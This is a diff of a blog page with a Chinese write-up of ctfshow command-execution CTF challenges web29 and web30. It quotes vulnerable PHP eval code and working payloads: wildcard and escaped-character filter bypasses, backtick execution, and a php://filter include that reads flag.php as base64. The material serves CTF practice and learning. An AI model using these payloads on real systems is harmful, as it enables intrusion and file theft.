@@ -142,10 +142,17 @@
       <span class="icon is-small"><i class="far fa-calendar-alt"></i></span>
       <span class="mr-2">Mar 25, 2021</span>
       <span class="icon is-small"><i class="far fa-clock"></i></span>
-      <span>3 min.</span>
+      <span>7 min.</span>
     </p>
 
-    <div class="content">ctfshow web 入门命令执行 web29 &lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&#34;/flag/i&#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：通配符； 看到有eval()执行函数 过滤了flag ，可以使用通配符进行绕过。所以payload为：c=system('cat f*');返回的flag进行了隐藏，右键查看源码即可。 也可以通过文件包含来解决，payload： 先传入?c=echo &quot;lhy&quot;;?&gt;ctfshow &lt;?php system('ls');看到有flag.php文件（前面需要echo &ldquo;lhy&rdquo;;?&gt;是因为传入c的时候表示一段代码的开始，?&gt;结束后开始执行后面的代码），接下来的为?c=echo &quot;lhy&quot;; ?&gt;ctfshow &lt;?php include($_GET['url']);&amp;url=php://filter/read=convert.base64-encode/resource=flag.php 补充：对于linux cat 和ca'&rsquo;t ca\t ca&quot;&ldquo;t效果是相同的，这样可以绕过字符的限制，如c=system('ca\t fla\g.php');
+    <div class="content">ctfshow web 入门命令执行 参考（抄）：https://www.cnblogs.com/yanwusheng/p/13860578.html，主要是纪录给自己看（侵删）。
+web29 &lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&#34;/flag/i&#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：通配符； 看到有eval()执行函数 过滤了flag ，可以使用通配符进行绕过。所以payload为：c=system('cat f*');返回的flag进行了隐藏，右
+键查看源码即可。
+也可以通过文件包含来解决，payload：
+先传入?c=echo &quot;lhy&quot;;?&gt;ctfshow &lt;?php system('ls');看到有flag.php文件（前面需要echo &ldquo;lhy&rdquo;;?&gt;是
+因为传入c的时候表示一段代码的开始，?&gt;结束后开始执行后面的代码），接下来的为?c=echo &quot;lhy&quot;; ?
+&gt;ctfshow &lt;?php include($_GET['url']);&amp;url=php://filter/read=convert.base64-encode/resource=flag.php
+补充：对于linux cat 和ca'&rsquo;t ca\t ca&quot;&ldquo;t效果是相同的，这样可以绕过字符的限制，如c=system('ca\t fla\g.php');
 web30 &lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&#34;/flag|system|php/i&#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：反引号执行系统命令； 与29相比增加了对命令函数的过滤，命令执行函数有很多，如 system()
 passthru()
 exec()
@@ -154,10 +161,7 @@ popen()
 proc_open()
 pcntl_exec()
 反引号
-只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`;
-payload2:?c=passthru(&quot;cat f*&quot;);
-还可以采用文件包含：
-payload3:?c=echo &quot;lhy &quot;; include($_GET['url']); ?</div>
+只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`;</div>
 
   </div>
 </article>
